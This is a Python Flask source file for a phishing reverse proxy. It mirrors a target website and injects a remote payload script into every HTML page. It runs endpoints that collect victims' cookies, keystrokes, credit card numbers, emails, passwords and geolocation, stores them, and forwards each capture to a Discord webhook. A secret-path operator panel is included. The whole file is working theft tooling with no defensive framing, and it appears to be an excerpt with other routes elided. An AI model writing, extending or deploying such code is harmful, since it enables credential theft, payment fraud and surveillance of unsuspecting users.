from flask import Flask, request, Response, send_from_directory, jsonify
import requests
import json
import os
from datetime import datetime
import brotli
from core.database import Database
from core.detection import DataDetector
from core.discord_bot import DiscordBot
from colorama import Fore
from functools import wraps

# Initialize components
db = Database()
detector = DataDetector()
discord_bot = None
requests_history = []
MAX_HISTORY = 100

def initialize_discord_bot():
    global discord_bot
    settings = db.get_discord_settings()
    if settings['discord_webhook'] and settings['discord_token']:
        try:
            discord_bot = DiscordBot(settings['discord_webhook'], settings['discord_token'])
            print(f"{Fore.GREEN}[+] Discord bot initialized successfully!{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] Discord bot initialization failed: {str(e)}{Fore.RESET}")

# Initialize storage files
def ensure_json_files():
    files = {
        'cookies.json': [],
        'keylogs.json': [],
        'creditcards.json': [],
        'emails.json': [],
        'passwords.json': [],
        'geolocation.json': [],
        'forms.json': []
    }
    for file, default in files.items():
        if not os.path.exists(file):
            with open(file, 'w') as f:
                json.dump(default, f)

ensure_json_files()
initialize_discord_bot()

def start_proxy(target, host, port, secret):
    app = Flask(__name__, static_folder='panel', static_url_path='')

    # Serve panel files
    @app.route(f'/{secret}')
    def panel_index():
        return send_from_directory('panel', 'index.html')

    @app.route(f'/{secret}/<path:filename>')
    def panel_files(filename):
        return send_from_directory('panel', filename)

    # Serve payload script
    @app.route('/payload-script.js')
    def serve_payload():
        return send_from_directory('.', 'payload-script.js')

    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    def proxy(path):
        # Check if it's a panel request first
        if secret in path:
            if path == secret:
                return panel_index()
            elif path.startswith(f"{secret}/"):
                filename = path[len(f"{secret}/"):]
                return panel_files(filename)

        # Regular proxy handling
        target_url = f"https://{target}/{path}"
        
        # Handle OPTIONS for CORS
        if request.method == 'OPTIONS':
            return Response('', 200, {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': '*',
                'Access-Control-Allow-Headers': '*'
            })

        # Forward headers but exclude problematic ones
        headers = {
            key: value for key, value in request.headers if key.lower() not in [
                'host', 'content-length', 'connection'
            ]
        }
        headers['Host'] = target

        try:
            resp = requests.request(
                method=request.method,
                url=target_url,
                headers=headers,
                params=request.args,
                data=request.get_data(),
                cookies=request.cookies,
                allow_redirects=False,
                verify=False
            )

            # Process response headers
            excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
            headers = [
                (name, value) 
                for (name, value) in resp.raw.headers.items() 
                if name.lower() not in excluded_headers
            ]

            # Inject payload if HTML
            response = resp.content
            if 'text/html' in resp.headers.get('Content-Type', ''):
                try:
                    decoded = response.decode('utf-8')
                    payload = '<script src="/payload-script.js"></script>'
                    if '</head>' in decoded:
                        decoded = decoded.replace('</head>', f'{payload}</head>')
                    elif '<body>' in decoded:
                        decoded = decoded.replace('<body>', f'<body>{payload}')
                    response = decoded.encode('utf-8')
                except UnicodeDecodeError:
                    pass

            return Response(response, resp.status_code, headers)

        except Exception as e:
            print(f"Proxy Error: {str(e)}")
            return f"Error: {str(e)}", 500

    @app.route('/ep/api/cookies', methods=['POST'])
    def handle_cookies():
        data = request.json
        user_ip = request.remote_addr
        
        try:
            with open('cookies.json', 'r') as f:
                cookies = json.load(f)
            
            for cookie in data['cookies']:
                cookie_data = {
                    **cookie,
                    'ip': user_ip,
                    'url': data['url'],
                    'timestamp': data['timestamp']
                }
                cookies.append(cookie_data)
                
                # Save to database
                db.save_cookie(
                    cookie['name'],
                    cookie['value'],
                    user_ip,
                    cookie['domain']
                )
                
                # Send Discord alert
                if discord_bot:
                    discord_bot.send_webhook({
                        "embeds": [{
                            "title": "🍪 New Cookie Captured",
                            "color": 0xff0000,
                            "fields": [
                                {"name": "Name", "value": cookie['name']},
                                {"name": "Value", "value": cookie['value'][:100] + "..." if len(cookie['value']) > 100 else cookie['value']},
                                {"name": "Domain", "value": cookie['domain']},
                                {"name": "URL", "value": data['url']},
                                {"name": "IP", "value": user_ip}
                            ],
                            "timestamp": data['timestamp']
                        }]
                    })
            
            with open('cookies.json', 'w') as f:
                json.dump(cookies, f)
                
            return jsonify({'status': 'success'}), 200
            
        except Exception as e:
            print(f"Cookie handling error: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/ep/api/keylogger', methods=['POST'])
    def handle_keylogger():
        data = request.json
        user_ip = request.remote_addr
        timestamp = datetime.now().isoformat()
        
        try:
            with open('keylogs.json', 'r') as f:
                logs = json.load(f)
            
            keylog_data = {
                'keys': data['keys'],
                'url': data['url'],
                'ip': user_ip,
                'timestamp': timestamp
            }
            logs.append(keylog_data)
            
            with open('keylogs.json', 'w') as f:
                json.dump(logs, f)
            
            # Save to database
            db.save_keystrokes(data['keys'], data['url'], user_ip)
            
            # Send Discord alert
            if discord_bot:
                discord_bot.send_webhook({
                    "embeds": [{
                        "title": "⌨️ Keystrokes Captured",
                        "color": 0x00ff00,
                        "fields": [
                            {"name": "Keys", "value": data['keys']},
                            {"name": "URL", "value": data['url']},
                            {"name": "IP", "value": user_ip}
                        ],
                        "timestamp": timestamp
                    }]
                })
            
            return jsonify({'status': 'success'}), 200
            
        except Exception as e:
            print(f"Keylogger error: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/ep/api/sensitive', methods=['POST'])
    def handle_sensitive():
        data = request.json
        user_ip = request.remote_addr
        timestamp = datetime.now().isoformat()
        
        try:
            # Determine file based on data type
            file_mapping = {
                'credit_card': 'creditcards.json',
                'email': 'emails.json',
                'password': 'passwords.json'
            }
            
            filename = file_mapping.get(data['type'])
            if not filename:
                return jsonify({'status': 'error', 'message': 'Invalid data type'}), 400
            
            with open(filename, 'r') as f:
                sensitive_data = json.load(f)
            
            entry = {
                'value': data['value'],
                'url': data['url'],
                'ip': user_ip,
                'timestamp': timestamp
            }
            sensitive_data.append(entry)
            
            with open(filename, 'w') as f:
                json.dump(sensitive_data, f)
            
            # Save to database
            db.save_sensitive_data(data['type'], data['value'], data['url'], user_ip)
            
            # Send Discord alert
            if discord_bot:
                alert_titles = {
                    'credit_card': '💳 Credit Card Detected',
                    'email': '📧 Email Detected',
                    'password': '🔑 Password Detected'
                }
                
                discord_bot.send_webhook({
                    "embeds": [{
                        "title": alert_titles[data['type']],
                        "color": 0xff0000,
                        "fields": [
                            {"name": "Value", "value": data['value']},
                            {"name": "URL", "value": data['url']},
                            {"name": "IP", "value": user_ip}
                        ],
                        "timestamp": timestamp
                    }]
                })
            
            return jsonify({'status': 'success'}), 200
            
        except Exception as e:
            print(f"Sensitive data handling error: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/ep/api/geolocation', methods=['POST'])
    def handle_geolocation():
        data = request.json
        user_ip = request.remote_addr
        timestamp = datetime.now().isoformat()
        
        try:
            with open('geolocation.json', 'r') as f:
                locations = json.load(f)
            
            location_data = {
                **data,
                'ip': user_ip,
                'timestamp': timestamp
            }
            locations.append(location_data)
            
            with open('geolocation.json', 'w') as f:
                json.dump(locations, f)
            
            # Save to database
            db.save_geolocation(
                user_ip,
                data.get('lat'),
                data.get('lon'),
                data.get('country', 'Unknown'),
                data.get('city', 'Unknown')
            )
            
            # Send Discord alert
            if discord_bot:
                discord_bot.send_webhook({
                    "embeds": [{
                        "title": "📍 Location Captured",
                        "color": 0x00ff00,
                        "fields": [
                            {"name": "Latitude", "value": str(data.get('lat', 'N/A'))},
                            {"name": "Longitude", "value": str(data.get('lon', 'N/A'))},
                            {"name": "IP", "value": user_ip},
                            {"name": "URL", "value": data['url']}
                        ],
                        "timestamp": timestamp
                    }]
                })
            
            return jsonify({'status': 'success'}), 200
            
        except Exception as e:
            print(f"Geolocation error: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    # ... (keep other existing routes) ...

    print(f"\n[*] Panel URL: http://{host}:{port}/{secret}")
    print(f"[*] Proxy running on http://{host}:{port}/")
    app.run(host='0.0.0.0', port=port, threaded=True)